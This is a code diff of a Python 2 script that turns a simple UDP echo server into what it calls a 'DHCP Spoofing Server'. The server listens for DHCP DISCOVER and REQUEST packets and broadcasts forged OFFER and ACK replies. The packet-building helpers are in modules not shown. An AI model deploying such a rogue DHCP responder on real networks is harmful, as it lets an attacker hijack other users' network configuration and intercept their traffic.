@@ -1,12 +1,14 @@
 import socket
 import info
 from utils import *
-from optionsProcessor import SERVER_HEX, addrToHex, DHCP_DISCOVER, DHCP_REQUEST
+from optionsProcessor import DHCP_DISCOVER, DHCP_REQUEST, toAddr
 import argparse
 
+
+
+#================================================
+# Reads relevant info from the received packet
 def getFields(packet):
-	# packet = [unbytefy(b) for b in packet]
-		
 	def pick(packet, strt, nbytes):
 		tmp = packet[strt:strt+nbytes]
 		tmp = [unbytefy(b) for b in tmp]
@@ -20,69 +22,57 @@ def getFields(packet):
 				break
 		return tmp
 
-	# assert all([len(x)==2 for x in packet])
-
 	fields = {}
-	# fields['op']     = get(packet, 1)
-	# fields['htype']  = get(packet, 1)
-	# fields['hlen']   = get(packet, 1)
-	# fields['hops']   = get(packet, 1)
-	# fields['xid']    = get(packet, 4)
-	# fields['secs']   = get(packet, 2)
-	# fields['flags']  = get(packet, 2)
-	# fields['ciaddr'] = get(packet, 4)
-	# fields['yiaddr'] = get(packet, 4)
-	# fields['siaddr'] = get(packet, 4)
-	# fields['giaddr'] = get(packet, 4)
-	# fields['chaddr'] = clear_stuffing(get(packet, 4*4+192))
-	# fields['cookie'] = get(packet, 4)
-	# fields['opts']   = getOpts(packet) # opts[0] -> Discover, Offer, Request, Ack, Nak
 	opts = pickOpt(packet, 28+16+192+4)
 
 	fields['xid']    = pick(packet, 4, 4)
-	# fields['siaddr'] = pick(packet,20, 4)
 	fields['chaddr'] = pick(packet,28, 4*4)
 	fields['opts']	 = int(getOpts(opts, focus=53),16)
+	
 	return fields
+#================================================
 
-def echo_server(port,address):
-	import json
-	""" A simple echo server """
-	# Create a UDP socket
+
+#================================================
+# Instantiates a UDP socket and initiates the server
+def echo_server(port):
 	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 	sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
 	# 25 here corresponds to SO_BINDTODEVICE, which is not exposed by Python (presumably for portability reasons).
 	sock.setsockopt(socket.SOL_SOCKET, 25, info.myInfo()[0])
+	sock.bind(('', port))
 
-	# Bind the socket to the port
-	# server_address = (host, port)
-	server_address = ('', port)
-	# print ("Starting up echo server on %s port %s" % server_address)
+	print 'Server is on!'
 
-	sock.bind(server_address)
-	# print address
-	haddress = addrToHex(address)
+	try:
+		while True:
+			data, _ = sock.recvfrom(data_payload)
 
-	while True:
-		data, _ = sock.recvfrom(data_payload)
-		# print ("received %s bytes from %s" % (len(data), '255.255.255.255'))
-	
-		if data:
-			fields = getFields(data)
+			if data:
+				fields = getFields(data)
 
-			response = 'ack'
-			# target	 = address
-			target	 = '255.255.255.255'
-			if fields['opts'] == DHCP_DISCOVER:
-				response = 'offer'
-			
-			sock.sendto(fill(response, fields['xid'], haddress, fields['chaddr']), (target,68))
-			print 'sent', response
+				comp 	 = ''
+				
+				if fields['opts'] == DHCP_DISCOVER:
+					response = 'offer'
+				
+				elif fields['opts'] == DHCP_REQUEST:
+					response = 'ack'
+					comp	 = 'to {}'.format(toAddr(manager.last))
+				
+				else:
+					continue
+				
+				sock.sendto(fill(response, fields['xid'], fields['chaddr']), ('255.255.255.255',68))
+				print 'sent', response, comp
+	except KeyboardInterrupt:
+		print 'Shutting down...'
+#================================================
+
+
 
 if __name__ == '__main__':
-	parser = argparse.ArgumentParser(description='Socket Server Example')
-	parser.add_argument('--address', action="store", dest="address", type=str, required=False, default='10.32.143.244')
-	args = parser.parse_args() 
-	# port = given_args.port
-	echo_server(DHCP_SERVER_PORT, args.address)
+	parser = argparse.ArgumentParser(description='DHCP Spoofing Server')
+	args = parser.parse_args()
+	echo_server(DHCP_SERVER_PORT)
